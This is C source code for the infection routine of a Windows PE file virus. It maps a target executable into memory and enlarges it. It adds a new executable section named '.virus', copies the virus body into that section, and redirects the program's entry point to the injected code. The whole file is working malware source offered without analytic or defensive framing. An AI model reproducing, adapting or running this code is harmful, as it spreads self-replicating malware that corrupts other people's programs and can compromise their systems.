#include "infect.h"

int infect(const char* filename, data_t* data) {
  file_view_t fileView;

  memzero(&fileView, sizeof(file_view_t));

  if (open_file_view(filename, &fileView, data) != 0){
    return 1;
  }

  if (!is_pe(fileView.startAddress)) {
    close_file_view(&fileView, data);
    return 2;
  }

  IMAGE_NT_HEADERS* ntHeaders = get_nt_header(fileView.startAddress);

  uint32_t extendedSize = fileView.size + ntHeaders->OptionalHeader.FileAlignment + align_value(data->codeSize, ntHeaders->OptionalHeader.FileAlignment);
  close_file_view(&fileView, data);
  fileView.size = extendedSize;

  if (open_file_view(filename, &fileView, data) != 0){
    return 1;
  }
  
  ntHeaders = get_nt_header(fileView.startAddress);

  IMAGE_SECTION_HEADER* sectionHeader = (IMAGE_SECTION_HEADER*) ((uint8_t*)ntHeaders + sizeof(IMAGE_NT_HEADERS)); //was ntHeaders + 1???
  sectionHeader += ntHeaders->FileHeader.NumberOfSections;

  if (!is_section_header_empty(sectionHeader)) {
    close_file_view(&fileView, data);
    return 3;
  }

  //File will be altered after here

  ntHeaders->OptionalHeader.SizeOfCode += align_value(data->codeSize, ntHeaders->OptionalHeader.FileAlignment);
  ntHeaders->OptionalHeader.SizeOfImage += align_value(data->codeSize, ntHeaders->OptionalHeader.SectionAlignment);
  //ntHeaders->OptionalHeader.SizeOfHeaders = ? //TODO handle

  create_section_header(sectionHeader, ntHeaders, data);

  memcp(data->codeBegin, (uint8_t*)fileView.startAddress + sectionHeader->PointerToRawData, data->codeSize);

  ntHeaders->OptionalHeader.AddressOfEntryPoint = sectionHeader->VirtualAddress + data->entryOffset;

  data->functions.flushViewOfFile(fileView.startAddress, extendedSize);
  close_file_view(&fileView, data);

  return 0;
}

void create_section_header(IMAGE_SECTION_HEADER* sectionHeader, IMAGE_NT_HEADERS* ntHeaders, data_t* data) {
  ntHeaders->FileHeader.NumberOfSections++;

  sectionHeader->Name[0] = '.';
  sectionHeader->Name[1] = 'v';
  sectionHeader->Name[2] = 'i';
  sectionHeader->Name[3] = 'r';
  sectionHeader->Name[4] = 'u';
  sectionHeader->Name[5] = 's';

  sectionHeader->Misc.VirtualSize = data->codeSize;
  sectionHeader->VirtualAddress = (sectionHeader - 1)->VirtualAddress + align_value((sectionHeader - 1)->Misc.VirtualSize, ntHeaders->OptionalHeader.SectionAlignment);
  sectionHeader->SizeOfRawData = align_value(data->codeSize, ntHeaders->OptionalHeader.FileAlignment);
  sectionHeader->PointerToRawData = (sectionHeader - 1)->PointerToRawData + align_value((sectionHeader - 1)->SizeOfRawData, ntHeaders->OptionalHeader.FileAlignment);
  sectionHeader->Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;
}

int open_file_view(const char* filename, file_view_t* fileView, data_t* data) {
  fileView->hFile = data->functions.createFileA(
    filename,
    GENERIC_READ | GENERIC_WRITE,
    FILE_SHARE_READ | FILE_SHARE_WRITE,
    NULL,
    OPEN_EXISTING,
    FILE_ATTRIBUTE_NORMAL,
    NULL
  );

  if (fileView->hFile == INVALID_HANDLE_VALUE) {
    return 1;
  }
  if(fileView->size == 0) {
    fileView->size = (DWORD)data->functions.getFileSize(fileView->hFile, NULL);
    if (fileView->size == INVALID_FILE_SIZE) {
      data->functions.closeHandle(fileView->hFile);
      return 2;
    }
  }

  fileView->hMap = data->functions.createFileMappingA(
    fileView->hFile,
    NULL,
    PAGE_READWRITE,
    0,
    fileView->size,
    NULL
  );

  if (fileView->hMap == NULL) {
    data->functions.closeHandle(fileView->hFile);
    return 3;
  }

  fileView->startAddress = (void*)data->functions.mapViewOfFile(
    fileView->hMap,
    FILE_MAP_ALL_ACCESS,
    0,
    0,
    fileView->size
  );

  if (fileView->startAddress == NULL) {
    data->functions.closeHandle(fileView->hMap);
    data->functions.closeHandle(fileView->hFile);
    return 4;
  }
  return 0;
}

void close_file_view(file_view_t* fileView, data_t* data) {
  data->functions.unmapViewOfFile((LPCVOID)fileView->startAddress);
  data->functions.closeHandle(fileView->hMap);
  data->functions.closeHandle(fileView->hFile);
  memzero(fileView, sizeof(file_view_t));
}
